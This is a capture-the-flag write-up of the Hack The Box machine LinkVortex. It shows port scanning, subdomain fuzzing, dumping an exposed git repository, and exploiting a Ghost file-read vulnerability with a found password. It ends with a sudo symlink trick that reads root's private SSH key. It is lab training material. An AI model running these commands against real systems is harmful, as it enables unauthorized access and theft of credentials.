![LinkVortex](https://labs.hackthebox.com/storage/avatars/97f12db8fafed028448e29e30be7efac.png)

---

| **Created by** | **Page**     | **Difficulty** | **OS**  |
|-------------|--------------|----------------|---------|
| [0xyassine](https://app.hackthebox.com/users/143843)        | [Hack The Box](https://www.hackthebox.com/)     | Easy           | Linux   |

---








- I start with a scan of the open ports and I continue with a scan of the versions and technologies that are running on the open ports that we have found
	
	```python
	nmap -p- --open --min-rate 5000 -Pn -sS 10.10.11.47 -oG scan
	nmap -p22,80 -sCV -Pn 10.10.11.47 -oN ports
	```

	![image](https://github.com/user-attachments/assets/7f773cb3-8c8d-42aa-be0a-45dd9c4be2fd)

- I go to the site and see that a de-tialized version of Ghost is running. I find that it has a vulnerability, [CVE-2023-40028](https://github.com/TryGhost/Ghost/security/advisories/GHSA-9c9v-w225-v5rg). I need to find a valid credential to be able to abuse this vulnerability.
	
	![image](https://github.com/user-attachments/assets/18ca98a7-3293-4927-8960-ff989ea25e90)

- I do a search for subdomains and I find one.

	```python
	wfuzz -c -t 100  --hh=230 -w  /usr/share/amass/wordlists/subdomains-top1mil-110000.txt -H "Host: FUZZ.linkvortex.htb" http://linkvortex.htb
	```

	![image](https://github.com/user-attachments/assets/ff557526-705e-4bbe-9cef-4d75885a1db6)

  ![image](https://github.com/user-attachments/assets/21f3466c-47ab-437e-806e-4a3c5f41f221)

- When listing the found subdomain I find a git repository. I download it with [git-dumper](https://github.com/arthaud/git-dumper)

	```python
	git-dumper "http://dev.linkvortex.htb/.git"  /home/rufo/linkVortex/content/example 
	```

- I search in the repository files and find some passwords. I try with the passwords I found and the vulnerability I found before and I manage to find some valid credentials.
	
	```python
	./CVE-2023-40028.sh -u admin@linkvortex.htb -p OctopiFociPilfer45
	```

- I modify the script to point to the endpoint and I manage to read internal files of the machine. LFI

	![image](https://github.com/user-attachments/assets/a6cfc387-f366-4ada-8e57-12cdd497dd78)

	![image](https://github.com/user-attachments/assets/b3e854aa-8bb4-4c65-9e74-26cf4a12b130)

- I list the repository files and manage to find some credentials in the production environment configuration file

	![image](https://github.com/user-attachments/assets/54556822-4366-44a8-bd4b-dfad3ae5409e)

- Thanks to these credentials I am able to log in via ssh and read the first flag

	![image](https://github.com/user-attachments/assets/106d9366-5e5a-45c5-807f-0e07e0423a9f)

- Listing the system files, I see that I can execute as root the file clean_symlink.sh and passing any file as argument.
- I create a couple of symbolic links to be able to read the file with the ssh key of the root user.

	![image](https://github.com/user-attachments/assets/a4a806f7-6830-4afb-a1ea-d25f727f8879)

	```python
	ln -s /root/.ssh/id_rsa link1.txt
	ln -s /tmp/a/link1.txt duo.png
	sudo CHECK_CONTENT=true /usr/bin/bash /opt/ghost/clean_symlink.sh /tmp/a/duo.png
	```

	![image](https://github.com/user-attachments/assets/aee342c8-20ab-4a9f-a0ab-453484fb7a41)

- With this key I connect via ssh as root and manage to read the second flag

	![image](https://github.com/user-attachments/assets/51b70c2a-f975-4531-badc-9bb614df7e48)
